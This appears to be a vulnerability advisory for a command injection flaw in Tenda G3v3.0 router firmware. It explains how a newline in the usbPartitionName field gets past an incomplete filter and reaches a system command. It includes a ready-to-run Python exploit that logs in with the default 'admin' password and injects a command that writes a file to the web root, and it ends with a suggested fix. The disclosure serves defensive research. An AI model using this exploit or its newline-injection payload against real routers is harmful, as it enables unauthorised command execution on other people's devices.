**First of all, you can see more detailed demonstration effects in exp.mkv**

## Affected Version
* <=Tenda-G3v3.0 V15.11.0.20

## Vulnerability Description
Tenda-G3v3.0 V15.11.0.20  was discovered to contain command injection  at url **/goform/umountUSBPartition**

## Vulnerability Details
In the function **formSetUSBPartitionUmount**, there is a **doSystemCmd("/usr/sbin/usb umount %s", (const char *)usbPartitionName);** instruction, the value of usbPartitionName comes from the user's post request.

![alt text](image.png)

The prod_system_param_valid function is in **libcommonprod.so**, and **its filtering is not complete because command injection can still be achieved through the escape character '\n'**

![alt text](image-1.png)

For example,**in the test.c function, '\n' is used for command injection**
![alt text](image-2.png)

**We can see that echo PWN!!! is successfully executed, so the same vulnerability exists in formSetUSBPartitionUmount.**

![alt text](image-3.png)

## exp
It should be noted that you need to login before accessing /goform/umountUSBPartition, so you need to login before posting the request.

```python
import requests

session = requests.Session()

login_url = "http://192.168.0.252/login/Auth"
headers = {
    "Host": "192.168.0.252",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "http://192.168.0.252",
    "Connection": "close",
    "Referer": "http://192.168.0.252/login.asp",
    "Cookie": "G3v3_user=",
    "Upgrade-Insecure-Requests": "1",
    "Priority": "u=0, i"
}

login_data = {
    "password": "YWRtaW4="  #base64 encoded 'admin'
}

response = session.post(login_url, headers=headers, data=login_data)

url = "http://192.168.0.252/goform/umountUSBPartition"
data = {"usbPartitionName": "\necho PWN!!! > /webroot/1.html\n"}
response = session.post(url, data=data)

print(response.text)
```

## Any suggested solutions to fix
**The filter list of the function prod_system_param_valid in libcommonprod.so should also be added '\n'**
